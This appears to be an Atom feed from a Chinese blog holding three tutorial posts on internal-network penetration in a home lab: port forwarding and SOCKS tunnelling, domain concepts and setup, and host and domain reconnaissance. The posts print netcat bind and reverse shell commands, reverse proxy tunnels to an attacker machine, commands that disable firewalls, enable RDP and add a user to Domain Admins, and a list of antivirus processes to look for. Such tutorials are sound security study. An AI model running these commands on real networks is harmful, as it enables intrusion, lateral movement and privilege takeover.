<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2019-12-23T00:52:41.378Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网学习三-代理与端口转发</title>
    <link href="0verwatch.top/LAN-pentest-learning-3.html"/>
    <id>0verwatch.top/LAN-pentest-learning-3.html</id>
    <published>2019-12-23T00:51:17.000Z</published>
    <updated>2019-12-23T00:52:41.378Z</updated>
    
    <content type="html"><![CDATA[<p>在内网渗透中代理是最重要的，因为外网无法直接访问其内网，我们后续的渗透无论是信息收集，还是<a id="more"></a>攻击其他内网下的机器，都需要代理成功后才能进行。</p><h3 id="代理与端口转发"><a href="#代理与端口转发" class="headerlink" title="代理与端口转发"></a>代理与端口转发</h3><p>这里就学习几种比较常用的，这里我搭建一个简单的环境，两台win2003，一台作为Web边界机器，另外一台作为内网机器</p><p>Web边界机器对应的网卡ip地址为192.168.70.145和172.17.18.2</p><p><img src="https://s2.ax1x.com/2019/12/22/QzfHld.png" alt="QzfHld.png"></p><p>内网机器对应的网卡ip地址为172.17.18.6</p><p><img src="https://s2.ax1x.com/2019/12/22/Qzfxk8.png" alt="Qzfxk8.png"></p><p>分别在两台机器上用phpstudy搭建了一个Web服务，方便查看</p><h4 id="Window-lcx端口转发"><a href="#Window-lcx端口转发" class="headerlink" title="Window lcx端口转发"></a>Window lcx端口转发</h4><p>这是一个window下使用的端口转发工具</p><p>lcx常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1:-listen &lt;ConnectPort1&gt; &lt;TransmitPort2&gt;监听p1,接收由p2转发过来的数据 </span><br><span class="line"></span><br><span class="line">2:-tarn &lt;ConnectPort&gt; &lt;TransmitHost&gt; &lt;TransmitPort&gt;端口转向功能，通过访问该端口可以直接与该主机或另一台主机的某一个端口进行通信 </span><br><span class="line"></span><br><span class="line">3:-slave &lt;TransmitHostB&gt; &lt;PortB&gt; &lt;TransmitHostA&gt; &lt;PortA&gt;端口转发功能，将目标A机上的端口A,转发到外网B机的端口B上</span><br></pre></td></tr></table></figure><p>一般的话主要用到的还是1和3功能</p><p>内网上执行<code>lcx.exe –slave 公网IP +端口 内网IP +端口</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 172.17.18.2 55 172.18.18.6 3389</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/22/Qzhup4.png" alt="Qzhup4.png"></p><p>把自己本地的3389端口转发到172.17.18.2的55端口</p><p>边界机器执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -listen 55 4999</span><br></pre></td></tr></table></figure><p>把监听的55端口转发到自己本机的2333端口</p><p><img src="https://s2.ax1x.com/2019/12/22/Qz5deI.png" alt="Qz5deI.png"></p><p>在边界机器上尝试连接，可以连接</p><p><img src="https://s2.ax1x.com/2019/12/22/Qz5sfS.png" alt="Qz5sfS.png"></p><p><img src="https://s2.ax1x.com/2019/12/22/Qz52Os.png" alt="Qz52Os.png"></p><h4 id="Linux下的portmap端口转发"><a href="#Linux下的portmap端口转发" class="headerlink" title="Linux下的portmap端口转发"></a>Linux下的portmap端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">监听1234端口,转发数据到2333端口</span><br><span class="line">本地:./portmap -m 2 -p1 1234 -p2 2333</span><br><span class="line"></span><br><span class="line">将目标的3389转发到本地的1234端口</span><br><span class="line">./portmap -m 1 -p1 3389 -h2 ip -p2 1234</span><br></pre></td></tr></table></figure><p>跟上面一样的效果，都是属于端口转发的</p><h4 id="NC反弹CMDshell-netcat"><a href="#NC反弹CMDshell-netcat" class="headerlink" title="NC反弹CMDshell(netcat)"></a>NC反弹CMDshell(netcat)</h4><h5 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h5><p>内网主机输入的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -l -p 8888 -e cmd.exe</span><br></pre></td></tr></table></figure><p>将cmd.exe转发到8888端口</p><p><img src="https://s2.ax1x.com/2019/12/22/QzoBRS.png" alt="QzoBRS.png"></p><p>边界机器输入的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -nvv 172.17.18.6 8888</span><br></pre></td></tr></table></figure><p>主动连接到内网机机的8888端口(获取cmd.exe的执行权限)</p><p><img src="https://s2.ax1x.com/2019/12/22/QzogZn.png" alt="QzogZn.png"></p><h5 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h5><p>内网机器上运行的命令，把shell反弹给边界机器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -e cmd.exe 172.17.18.6 8889</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/22/QzTzt0.png" alt="QzTzt0.png"></p><p>将内网的cmd.exe转发到攻击机的8889端口</p><p>边界机器上运行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc.exe -l -p 8889</span><br></pre></td></tr></table></figure><p>监听本地的8889端口，获取反弹的shell</p><p><img src="https://s2.ax1x.com/2019/12/22/Qz7C1U.png" alt="Qz7C1U.png"></p><h4 id="Xsocks"><a href="#Xsocks" class="headerlink" title="Xsocks"></a>Xsocks</h4><p>这款工具windows和Linux下都能使用，而且能够设置ssocks服务的密码，这里以他的正向socks5代理功能为例</p><p>这里以windows版本Xsocks为例，在边界机器上输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xsocks.exe -l 1080</span><br></pre></td></tr></table></figure><p>ip 192.168.70.129是外网的一台kali虚拟机，一开始是不能访问内网172.17.18.6的</p><p><img src="https://s2.ax1x.com/2019/12/23/Qzzwi4.png" alt="Qzzwi4.png"></p><p>在proxychains文件中修改代理之后，使用代理访问即可</p><p><img src="https://s2.ax1x.com/2019/12/23/lSp2Pe.png" alt="lSp2Pe.png"></p><p><img src="https://s2.ax1x.com/2019/12/23/lSp4KI.png" alt="lSp4KI.png"></p><p>window下使用proxifier去连接，这里使用本机去连接，ip为192.168.70.1</p><p>一开始是访问不到172.17.18.6的</p><p><img src="https://s2.ax1x.com/2019/12/22/Qzqzb4.png" alt="Qzqzb4.png"></p><p>当设置好proxifier的参数，我们就可以成功访问了</p><p><img src="https://s2.ax1x.com/2019/12/23/lSpvMn.png" alt="lSpvMn.png"></p><p><img src="https://s2.ax1x.com/2019/12/22/QzjFGn.png" alt="QzjFGn.png"></p><p>反弹socks5服务器的话使用-r参数跟上公网ip和端口号即可，他的帮助手册写的很清楚</p><h4 id="神器Earthworm"><a href="#神器Earthworm" class="headerlink" title="神器Earthworm"></a>神器Earthworm</h4><p>EW 是一套便携式的网络穿透工具，它具有 SOCKS v5服务架设和端口转发两大核心功能，可以帮助我们在复杂的网络环境下完成网络穿透，它支持多平台，借用了 ssocks 和 lcx.exe 的操作逻辑，并进行更多的功能强化。</p><h5 id="正向SOCKS-v5-服务器"><a href="#正向SOCKS-v5-服务器" class="headerlink" title="正向SOCKS v5 服务器"></a>正向SOCKS v5 服务器</h5><p>同样以上面的环境为例，在边界机器上搭建socks服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure><p>Window下使用proxifier去连接</p><p><img src="https://s2.ax1x.com/2019/12/22/QzXXxP.png" alt="QzXXxP.png"></p><p>可以成功访问内网的web服务</p><p><img src="https://s2.ax1x.com/2019/12/22/QzjFGn.png" alt="QzjFGn.png"></p><p>LInux下我们只需要修改proxychains.conf 就好</p><p><img src="https://s2.ax1x.com/2019/12/22/Qzjua4.png" alt="Qzjua4.png"></p><p>也可以成功访问内网ip</p><p><img src="https://s2.ax1x.com/2019/12/22/QzjlGR.png" alt="QzjlGR.png"></p><h5 id="反弹-SOCKS-v5-服务器"><a href="#反弹-SOCKS-v5-服务器" class="headerlink" title="反弹 SOCKS v5 服务器"></a>反弹 SOCKS v5 服务器</h5><p>攻击机输入下面的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p>监听自己的1080端口，同时修改proxychains文件的代理</p><p><img src="https://s2.ax1x.com/2019/12/22/Qzx1u6.png" alt="Qzx1u6.png"></p><p>边界服务器输入下面的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d 192.168.70.129 -e 8888</span><br></pre></td></tr></table></figure><p>相当于服务发送到公网</p><p>此时再对内网地址进行访问，成功！</p><p><img src="https://s2.ax1x.com/2019/12/22/Qzxa8A.png" alt="Qzxa8A.png"></p><p>同样的window可以使用proxifier进行代理服务</p><p>当然挂上代理还有其他操作，我们不仅仅可以访问内网一些Web服务，还可以通过<code>proxychains msfconsole</code>打开msf去进行一些端口的攻击扫描等，思路很多，挂上代理是关键一步。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在内网渗透中代理是最重要的，因为外网无法直接访问其内网，我们后续的渗透无论是信息收集，还是
    
    </summary>
    
      <category term="内网渗透学习" scheme="0verwatch.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="内网渗透" scheme="0verwatch.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网学习二-信息收集</title>
    <link href="0verwatch.top/LAN-pentest-learning-1.html"/>
    <id>0verwatch.top/LAN-pentest-learning-1.html</id>
    <published>2019-12-23T00:43:47.000Z</published>
    <updated>2019-12-23T00:50:51.804Z</updated>
    
    <content type="html"><![CDATA[<p>先从一些概念性东西学起<a id="more"></a>。。。</p><h3 id="内网是啥？！！"><a href="#内网是啥？！！" class="headerlink" title="内网是啥？！！"></a>内网是啥？！！</h3><p>内网也指局域网（Local Area Network，LAN），是指在某一区域内由多台计算机互联而成的计算机组，内网是<strong>封闭的</strong>，它可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p><h3 id="一些名词"><a href="#一些名词" class="headerlink" title="一些名词"></a>一些名词</h3><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p>在一个大的单位内，可能有成百上千台计算机互相连接组成局域网，它们都会列在“网络”（网上邻居）内，如果不分组就会导致混乱，微软提出工作组的概念，方便管理。</p><p><img src="https://s2.ax1x.com/2019/12/21/QvmHB9.png" alt="QvmHB9.png" style="zoom:67%;"></p><p><img src="https://s2.ax1x.com/2019/12/21/QvmWt0.png" alt="QvmWt0.png" style="zoom:67%;"></p><p>但是工作组并没有真正的集中管理作用，就说只有方便区分的一个管理作用。</p><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><p>为了让工作组有一个集中管理的功能，域的出现大大弥补了这个缺口。域（Domain）是一个有安全边界的计算机集合（安全边界的意思是：在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单地把域理解成升级版的工作组。</p><h4 id="域控制器（Domain-Controller，DC）"><a href="#域控制器（Domain-Controller，DC）" class="headerlink" title="域控制器（Domain Controller，DC）"></a>域控制器（Domain Controller，DC）</h4><p>域控制器是一个域中的一台类似管理服务器的计算机，我们可以形象地将它理解为一个单位的门卫。域控制器负责每一台联入的计算机和用户的验证工作。</p><p>域控制器包含由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p><p>因此，渗透域的最终目的是获取域控的系统权限，进而获取域内所有用户的账号和密码。</p><h4 id="域的几种环境"><a href="#域的几种环境" class="headerlink" title="域的几种环境"></a>域的几种环境</h4><h5 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h5><p>就是一个域，说了和没说一个样XD，一般在一个域内要建立至少两个域服务器，一个作为DC，另一个作为备份DC。</p><h5 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h5><p>出于管理及其他需求，需要在网络中划分多个域。第一个域称为父域，各分部的域称为该域的子域。这是个相对概念。。</p><h5 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h5><p>指若干个域通过建立信任关系而组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他域，两个域之间相互访问则需要建立信任关系（Trust Relation）。信任关系是连接不同域的桥梁。</p><p><img src="https://s2.ax1x.com/2019/12/21/QvuVaR.png" alt="QvuVaR.png"></p><h5 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h5><p>域森林（Forest）是指若干个域树通过建立信任关系组成的集合。</p><p><img src="https://s2.ax1x.com/2019/12/21/QvuGdA.png" alt="QvuGdA.png"></p><h4 id="活动目录（Active-Directory，AD）"><a href="#活动目录（Active-Directory，AD）" class="headerlink" title="活动目录（Active Directory，AD）"></a>活动目录（Active Directory，AD）</h4><p>指域环境中提供目录服务的组件。<br>活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制。</p><p>活动目录主要提供以下功能：<br>账号集中管理，软件集中管理，环境集中管理等</p><hr><p><strong>域控制器和活动目录的关系：</strong></p><p>用于存储活动目录数据库的计算机称为DC。所以，要实现域环境，其实就是要安装AD。当内网中的一台计算机上安装了AD，它就变成了DC。</p><hr><h4 id="域中计算机的分类"><a href="#域中计算机的分类" class="headerlink" title="域中计算机的分类"></a>域中计算机的分类</h4><p>1.域控制器</p><p>2.成员服务器 – 有服务没安装AD</p><p>3.客户机 – 可利用这些机子登录域</p><p>4.独立服务器 – 不加入域也不安装AD</p><p>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</p><h4 id="域中的权限组"><a href="#域中的权限组" class="headerlink" title="域中的权限组"></a>域中的权限组</h4><p>内网中重要的一些权限组包括本地组，全局组，通用组</p><p>本地域组的成员可以来自所有域的用户和组，但其作用域只能是当前域。<br>全局组的成员只能来自当前域的用户和组，而作用域可以是所有的域。<br>本地域组的权利是自身的，全局域的权利是来自其属于的本地域组的。</p><p>可以简单这样记忆：<br>域本地组：来自全林用于本域</p><p>全局组：来自本域作用于全林</p><p>通用组：来自全林用于全林</p><hr><p>本地域组的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Administrators（管理员组） ————最重要的权限</span><br><span class="line">Remote Desktop Users（远程登录组）</span><br><span class="line">Print Operators（打印机操作员组）</span><br><span class="line">Account Operators（帐号操作员组）</span><br><span class="line">Server Operaters（服务器操作员组）</span><br><span class="line">Backup Operators（备份操作员组）</span><br></pre></td></tr></table></figure><p>全局组、通用组的一些权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</span><br><span class="line">Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</span><br><span class="line">Schema Admins（架构管理员组）————最重要的权限</span><br><span class="line">Domain Users（域用户组）</span><br></pre></td></tr></table></figure><hr><p><strong>A-G-DL-P策略</strong></p><p>A-G-DL-P 策略是指，将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。按照 A-G-DL-P 策略对用户进行组织和管理会更容易。</p><p><img src="https://s2.ax1x.com/2019/12/21/QxFac9.png" alt="QxFac9.png" style="zoom:67%;"></p><p><img src="https://s2.ax1x.com/2019/12/21/QxFdXR.png" alt="QxFdXR.png"></p><h4 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h4><p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段，这一网段内的计算机拥有相同的网络边界，在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略（NACL），从而规定允许哪些IP 地址访问此域和不允许哪些IP 地址访问此域、允许此域访问哪些IP 地址/网段和不允此域许访问哪些IP 地址/网段。</p><p><img src="https://s2.ax1x.com/2019/12/21/QxkZHx.png" alt="QxkZHx.png"></p><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>两个防火墙之间的空间被称为DMZ。DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>特点：</p><p>（1）内网可以访问外网<br>（2）内网可以访间DMZ<br>（3）外网不能访间内网<br>（4）外网可以访问DMZ<br>（5）DMZ不能访间内网<br>（6）DMZ不能访何外网</p><h3 id="域环境搭建"><a href="#域环境搭建" class="headerlink" title="域环境搭建"></a>域环境搭建</h3><p>这里以Win2008 R2为例，建立域，搭建AD，构成DC，准备了2台虚拟机，，一台win08 R2，一台Win7 x64，使用Host only模式搭建，搭建的时候最好先关闭防火墙</p><p>Win08 R2先配置好ip属性，ip为192.168.55.2，这里需要注意的是配置DNS指向的域名指向自己，一般域控也是DNS服务提供的那台机子</p><p><img src="https://s2.ax1x.com/2019/12/22/Qx0RnH.png" alt="Qx0RnH.png"></p><p>可以改一下计算机名字为DC，方便辨认</p><p><img src="https://s2.ax1x.com/2019/12/22/Qx0OBj.png" alt="Qx0OBj.png"></p><p>配置好win7主机的ip地址为192.168.55.6，保证两台主机各自网络都是通的</p><p><img src="https://s2.ax1x.com/2019/12/22/Qx0ccD.png" alt="Qx0ccD.png"></p><p><img src="https://s2.ax1x.com/2019/12/22/Qxrm6O.png" alt="Qxrm6O.png"></p><p>WIN7 的主机改名为win7x64-1</p><p><img src="https://s2.ax1x.com/2019/12/22/QxByan.png" alt="QxByan.png"></p><p>回到Win2008开始配置AD，将其设置为域控，过程中会自动帮你安装号DNS服务的，添加角色中选择我们需要的功能</p><p><img src="https://s2.ax1x.com/2019/12/22/Qxs1rF.png" alt="Qxs1rF.png"></p><p>安装完之后，在服务器管理器中启动域安装向导</p><p><img src="https://s2.ax1x.com/2019/12/22/Qxsyad.png" alt="Qxsyad.png"></p><p>新建一个域</p><p><img src="https://s2.ax1x.com/2019/12/22/QxsRRP.png" alt="QxsRRP.png"></p><p>给域添加一个根域名，域里面的机器会根据自己的计算机名这个根域名拼接自己的域名，比如机器名为DC就会拼接成DC.test.lab</p><p><img src="https://s2.ax1x.com/2019/12/22/QxsWxf.png" alt="QxsWxf.png"></p><p>然后就是一个兼容性的选择，这里选择一个win2003即可</p><p><img src="https://s2.ax1x.com/2019/12/22/Qxy9o9.png" alt="Qxy9o9.png"></p><p>然后就是帮你安装DNS服务了，点击继续即可</p><p><img src="https://s2.ax1x.com/2019/12/22/QxyVsO.png" alt="QxyVsO.png"></p><p>可以更改存放数据的位置，可以直接下一步</p><p><img src="https://s2.ax1x.com/2019/12/22/QxyQJI.png" alt="QxyQJI.png"></p><p>安装好重启，接着在DC上创建一个普通的域用户，我们可以往这个用户名里面添加我们准备的那台Win7了</p><p><img src="https://s2.ax1x.com/2019/12/22/QxyOkd.png" alt="QxyOkd.png"></p><p><img src="https://s2.ax1x.com/2019/12/22/Qx6kkj.png" alt="Qx6kkj.png"></p><p>新建的用户是属于Domain users组的</p><p><img src="https://s2.ax1x.com/2019/12/22/Qx63N9.png" alt="Qx63N9.png"></p><p>然后把Win7 加入域内</p><p><img src="https://s2.ax1x.com/2019/12/22/Qx6r4A.png" alt="Qx6r4A.png"></p><p>加入到用户test1中</p><p><img src="https://s2.ax1x.com/2019/12/22/Qx6fHg.png" alt="Qx6fHg.png"></p><p>成功添加后，就可以在域控查看加入的机器了</p><p><img src="https://s2.ax1x.com/2019/12/22/Qxca2q.png" alt="Qxca2q.png"></p><h3 id="域相关命令操作"><a href="#域相关命令操作" class="headerlink" title="域相关命令操作"></a>域相关命令操作</h3><p>查看域中的用户名 <code>net user /domain</code></p><p><img src="https://s2.ax1x.com/2019/12/22/QzigD1.png" alt="QzigD1.png"></p><p>查询域组名称 <code>net group /domain</code></p><p><img src="https://s2.ax1x.com/2019/12/22/QziWE6.png" alt="QziWE6.png"></p><p>添加域管理员账号，我们先添加普通域用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user 用户名 密码 /add /domain</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/22/QzFPrn.png" alt="QzFPrn.png"></p><p>普通域用户提升为域管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; linen /add /domain</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/12/22/QzFKM9.png" alt="QzFKM9.png"></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>书籍：《内网安全攻防：渗透测试实战指南》</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;先从一些概念性东西学起
    
    </summary>
    
      <category term="内网渗透学习" scheme="0verwatch.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="内网渗透" scheme="0verwatch.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>LAN-pentest-learning-2</title>
    <link href="0verwatch.top/LAN-pentest-learning-2.html"/>
    <id>0verwatch.top/LAN-pentest-learning-2.html</id>
    <published>2019-12-22T00:48:33.000Z</published>
    <updated>2019-12-23T00:53:06.993Z</updated>
    
    <content type="html"><![CDATA[<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>主要还是常规操作，过一遍<a id="more"></a>。。</p><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><p>1.<code>net view</code></p><p>获取当前组的计算机名，查看同一域/工作组的计算机列表，下图可以看到域内有两台机器</p><p><img src="https://s2.ax1x.com/2019/12/22/QxOBVJ.png" alt="QxOBVJ.png"></p><ol start="2"><li><code>ipconfig  /all</code></li></ol><p>查询网络配置信息，判断是否有域的话可以根据DNS的后缀</p><p><img src="https://s2.ax1x.com/2019/12/19/Qb35RO.png" alt="Qb35RO.png"></p><p><code>nslookup</code></p><p>通过反向解析查询命令<code>nslookup</code> 来解析域名的IP 地址。使用解析出来的IP 地址进行对比，判断域控制器和DNS 服务器是否在同一台服务器上</p><p><img src="https://s2.ax1x.com/2019/12/22/QxOXqg.png" alt="QxOXqg.png"></p><ol start="3"><li>获取系统信息</li></ol><p><code>systemifo</code></p><p><img src="https://s2.ax1x.com/2019/12/19/Qb8lwR.png" alt="Qb8lwR.png"></p><ol start="4"><li>查看安装的软件及版本、路径</li></ol><p>wmic命令:  </p><p><code>wmic product get name,version</code></p><p><img src="https://s2.ax1x.com/2019/12/19/QbGEBd.png" alt="QbGEBd.png"></p><p>当然也可以使用powershell命令，因为powershell是系统自带的</p><p><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></p><p><img src="https://s2.ax1x.com/2019/12/19/QbYaXF.png" alt="QbYaXF.png"></p><ol start="5"><li>查询本机的一些服务</li></ol><p><code>wmic service list brief</code></p><p><img src="https://s2.ax1x.com/2019/12/22/QxX2Yn.png" alt="QxX2Yn.png"></p><p>推测域内是否都安装了这样的一些服务,特别是一些杀软</p><ol start="6"><li>查询进程信息</li></ol><p><code>tasklist</code> 和 <code>wmic process list brief</code>都行</p><p><img src="https://s2.ax1x.com/2019/12/22/QxXjl6.png" alt="QxXjl6.png"></p><p>需要注意的是这里面的进程名字，可以观察里面是否存在杀软之类的</p><table><thead><tr><th>进 程</th><th>软件名称</th></tr></thead><tbody><tr><td>360SD.EXE</td><td>360杀毒</td></tr><tr><td>360TRAY.EXE</td><td>360 实时保护</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360 主动防御</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山卫士</td></tr><tr><td>SAFEDOGUPDATECENTER.EXE</td><td>服务器安全狗</td></tr><tr><td>AVGUARD.EXE</td><td>小红伞</td></tr></tbody></table><ol start="7"><li>用户信息的查询</li></ol><p><code>net user</code></p><p><img src="https://s2.ax1x.com/2019/12/22/Qxju7Q.png" alt="Qxju7Q.png"></p><p>查询本地管理员组信息,通常那个域内机器会包含一些域内的信息</p><p><code>net localgroup administrators</code></p><p><img src="https://s2.ax1x.com/2019/12/22/Qxjlhn.png" alt="Qxjlhn.png"></p><p>查询当前在线用户  <code>query user || qwinsta</code></p><p><img src="https://s2.ax1x.com/2019/12/22/QxjTjf.png" alt="QxjTjf.png"></p><ol start="8"><li>查看端口信息</li></ol><p><code>netstat -ano</code></p><p>观察一些服务的信息</p><p><img src="https://s2.ax1x.com/2019/12/22/Qxjz3q.png" alt="Qxjz3q.png"></p><ol start="9"><li>查看路由表信息</li></ol><p><code>arp -a</code></p><p><code>route print</code></p><ol start="10"><li>防火墙相关配置</li></ol><p>03之前关闭防火墙</p><p><code>netsh firewall set opmode disable</code></p><p>03之后 (需要管理员权限)</p><p><code>netsh advfirewall set allprofiles state off</code></p><p>查看防火墙配置<code>netsh firewall show config</code></p><p><img src="https://s2.ax1x.com/2019/12/22/Qxvnv6.png" alt="Qxvnv6.png"></p><p>一般的话不要直接关闭防火墙，关闭防火墙动作太大，我们可以通过设置防火墙的规则去完成我们需要的操作条件。</p><ol start="11"><li>开启3389端口</li></ol><p>server 03 开启</p><p><code>wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</code></p><p>server 08 和 server 12 开启</p><p><code>wmic /namespace:\\root\cimv2\terminalservices pathwin32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</code></p><p><code>wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</code></p><p><code>reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></p><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><ol><li>查询域SID</li></ol><p><code>whoami /all</code></p><ol start="2"><li>查询当前指定账户的详细信息</li></ol><p><code>net user XXX /domain</code></p><p><img src="https://s2.ax1x.com/2019/12/22/QzpXpd.png" alt="QzpXpd.png"></p><ol start="3"><li>查询当前登录域及登录用户信息</li></ol><p><code>net config workstation</code></p><p><img src="https://s2.ax1x.com/2019/12/22/Qz9PAS.png" alt="Qz9PAS.png"></p><ol start="4"><li>判断主域</li></ol><p><code>net time domain</code></p><p>一般会有三种情况</p><p>存在域，但当前用户不是域用户，提示说明权限不够</p><p><img src="https://s2.ax1x.com/2019/12/22/Qz9u7T.png" alt="Qz9u7T.png"></p><p>存在域，并且当前用户是域用户</p><p><img src="https://s2.ax1x.com/2019/12/22/Qz939J.png" alt="Qz939J.png"></p><p>当前网络环境为工作组，不存在域</p><p><img src="https://s2.ax1x.com/2019/12/22/Qz9UHK.png" alt="Qz9UHK.png"></p><ol start="5"><li>查找域控</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><h4 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h4><p>内网存活主机的探测是内网渗透中不可或缺的一个环节。在扫描的时候，应尽量避免使用Namp 等工具进行暴力扫描，尽量使用目标系统自带的各种工具，推荐使用PowerShell 脚本。对于Windows 7 以下版本的系统，可以使用VBS 脚本。</p><p>一般我们首先是通过计算机名字确定ip地址，然后这样才便于我们探测内网存活主机，这里就以我搭的环境为例，域控名叫DC，我们去ping一下就得到ip了</p><p><img src="https://s2.ax1x.com/2019/12/22/QzP0ld.png" alt="QzP0ld.png"></p><ol><li>NetBIOS</li></ol><p>NetBIOS 是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的统一的命令集，作用是给局域网提供网络及其他特殊功能。几乎所有的局域网都是在NetBIOS 协议的基础上工作的，NetBIOS 的工作流程是正常的机器名解析查询应答过程，推荐优先使用。</p><p>直接上传使用即可</p><p><img src="https://s2.ax1x.com/2019/12/22/Qz92Hf.png" alt="Qz92Hf.png"></p><ol start="2"><li><p>icmp协议探活</p><p><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr 